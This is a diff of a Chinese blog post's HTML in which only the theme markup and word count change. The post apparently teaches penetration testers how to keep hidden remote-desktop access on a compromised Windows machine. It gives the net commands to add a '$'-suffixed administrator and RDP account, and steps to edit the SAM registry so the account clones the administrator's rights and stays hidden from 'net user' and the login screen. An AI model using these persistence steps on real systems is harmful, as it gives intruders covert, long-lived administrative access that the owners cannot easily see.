@@ -84,7 +84,7 @@
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>文章字数</i>
-                    2k
+                    1.8k
                 </span>
                 
                 
@@ -125,11 +125,11 @@
     <div class='main'>
         <div class="content markdown animated fadeIn">
             <p>我们在渗透的过程中拿到权限之后想要植入后门(3389登陆)，net命令添加用户还是太明显了，无论是net user 或者登陆的时候都能看见我们创建的后门账号，今天碰巧看了篇实战文章，记录个留后门的小技巧<br><a id="more"></a></p>
-<h1 id="用户后面添加"><a href="#用户后面添加" class="headerlink" title="用户后面添加$"></a>用户后面添加$</h1><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">net user defaultuser0$ somepasswordhere /add /y</span><br><span class="line">net localgroup administrators defaultuser0$ /add</span><br><span class="line">net localgroup &quot;remote desktop users&quot; defaultuser0$ /add</span><br></pre></td></tr></table></div></figure>
+<h1 id="用户后面添加"><a href="#用户后面添加" class="headerlink" title="用户后面添加$"></a>用户后面添加$</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">net user defaultuser0$ somepasswordhere /add /y</span><br><span class="line">net localgroup administrators defaultuser0$ /add</span><br><span class="line">net localgroup &quot;remote desktop users&quot; defaultuser0$ /add</span><br></pre></td></tr></table></figure>
 <p>这样我们在net user的时候我们添加的用户就不会被显示出来了<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/user.png" alt><br>不过在登陆的时候这个账号还是显示出来了<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/login.png" alt></p>
 <h1 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h1><p>regedit打开注册表，然后找到HKEY_LOCAL_MACHINE\SAM\SAM,右键点击权限，将读写权限赋予 administrator<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/sam.png" alt><br>重新打开注册表(这里不重新打开，sam目录下的内容无法展开)</p>
 <p>将 administrator 对应目录中的F值复制到后门用户对应目录中的F值<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/f.png" alt><br>复制完成后，把 defaultuser0$ 和其对应的 0000003EC 目录导出并保存(这里不一定是3EC，具体你看你用户的类型)<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/export.png" alt><br>然后删除刚才的后门用户</p>
-<figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user defaultuser0$ /del</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user defaultuser0$ /del</span><br></pre></td></tr></table></figure>
 <p><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/login_2.png" alt><br>这里defaultuser0$就没有了</p>
 <p>然后我们远程桌面连接，输入后门的账号密码就行了</p>
 <p>不过据说这两种方法都不是很安全，还待后续挖掘更多的后门小技巧</p>
